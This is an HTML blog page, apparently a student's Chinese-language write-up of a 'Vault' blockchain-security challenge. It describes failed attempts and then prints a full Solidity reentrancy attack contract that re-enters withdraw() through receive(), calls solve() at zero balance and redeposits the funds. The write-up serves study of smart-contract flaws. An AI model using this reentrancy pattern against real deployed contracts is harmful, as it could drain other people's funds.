@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Vault | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="真的不容易。。。尝试了好几种方法都以失败告终###尝试一：单纯的重入漏洞，就上课讲的那个，这种攻击需要满足：balanceOf[…]可以溢出（0.8以下版本或者unchecked），或者withdraw方法无法回滚，否则会因为交易失败而回滚，但是题中均不满足###尝试二：想着用msg.value多次传入 这里是因为上次考试的第三题产生的想法，其实我并没有把那道题理解透彻，所以会有这种想法  ###">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vault">
+<meta property="og:url" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="真的不容易。。。尝试了好几种方法都以失败告终###尝试一：单纯的重入漏洞，就上课讲的那个，这种攻击需要满足：balanceOf[…]可以溢出（0.8以下版本或者unchecked），或者withdraw方法无法回滚，否则会因为交易失败而回滚，但是题中均不满足###尝试二：想着用msg.value多次传入 这里是因为上次考试的第三题产生的想法，其实我并没有把那道题理解透彻，所以会有这种想法  ###">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-1.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-2.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/99809584D870EC2E106BE6197CE09170.jpg">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-3.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-4.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image.png">
+<meta property="article:published_time" content="2023-11-27T08:58:00.000Z">
+<meta property="article:modified_time" content="2023-12-04T15:58:14.121Z">
+<meta property="article:author" content="fathergun">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://oo90909.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-区块链安全/其他/Vault" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/" class="article-date">
+  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Vault
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>真的不容易。。。<br>尝试了好几种方法都以失败告终<br>###尝试一：<br>单纯的重入漏洞，就上课讲的那个，这种攻击需要满足：<br>balanceOf[…]可以溢出（0.8以下版本或者unchecked），或者withdraw方法无法回滚，否则会因为交易失败而回滚，但是题中均不满足<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-1.png" alt="Alt text"><br>###尝试二：<br>想着用msg.value多次传入<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-2.png" alt="Alt text"></p>
+<p>这里是因为上次考试的第三题产生的想法，其实我并没有把那道题理解透彻，所以会有这种想法</p>
+<hr>
+<p>###正解：<br>不一定非要把valut合约中的余额取干净，只要在余额为0的时候调用solve就可以了，之后再deposit，把钱充值回去，类似于闪电贷<br>思路图：<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/99809584D870EC2E106BE6197CE09170.jpg" alt="Alt text"></p>
+<p>最后结果达成了，flag为true，但是余额却不是0<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-3.png" alt="Alt text"></p>
+<p>成功！<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-4.png" alt="Alt text"></p>
+<p>实现过程中出现了一些问题，导致花在实现的时间上很长，也发现了<br>用console.log这个时候比debug好用的多<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image.png" alt="Alt text"></p>
+<p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line"></span><br><span class="line">Vault va;</span><br><span class="line"></span><br><span class="line">uint8 count=0;//这里设置count是因为要严格区分第一次和第二次调用receive方法</span><br><span class="line"></span><br><span class="line">constructor()payable  &#123;&#125;</span><br><span class="line"></span><br><span class="line">function getPara(address to)public payable &#123;</span><br><span class="line">    va=Vault(to);</span><br><span class="line">  va.deposit&#123;value:msg.value&#125;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function start()public payable &#123;</span><br><span class="line">va.withdraw(100);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">receive() external payable &#123; </span><br><span class="line">   if (count==0)&#123;//第一次调用receive</span><br><span class="line">    console.log(&quot;attack balance is&quot;,address(va).balance,&quot;the count is&quot;,count);</span><br><span class="line">        count++;</span><br><span class="line">    va.withdraw(100);</span><br><span class="line">    console.log(&quot;attack balance is&quot;,address(va).balance,&quot;the count is&quot;,count);</span><br><span class="line">   &#125;</span><br><span class="line">   if (count==1)&#123;//第二次调用reveive</span><br><span class="line">    count++;</span><br><span class="line">    console.log(&quot;attack balance is&quot;,address(va).balance,&quot;the count is&quot;,count);</span><br><span class="line">    va.solve(59);</span><br><span class="line">    va.deposit&#123;value:100&#125;();</span><br><span class="line">    console.log(&quot;deposit successful,va balance is&quot;,address(va).balance);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/" data-id="clr5va9a0000excudb39y6dhu" data-title="Vault" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          PiggyBank
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">jump</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/01/08/%E6%9D%82%E6%96%87/%E6%AF%9B%E6%B3%BD%E4%B8%9C/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/%E6%9D%82%E6%96%87/%E5%92%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/06/%E6%9D%82%E6%96%87/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 fathergun<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
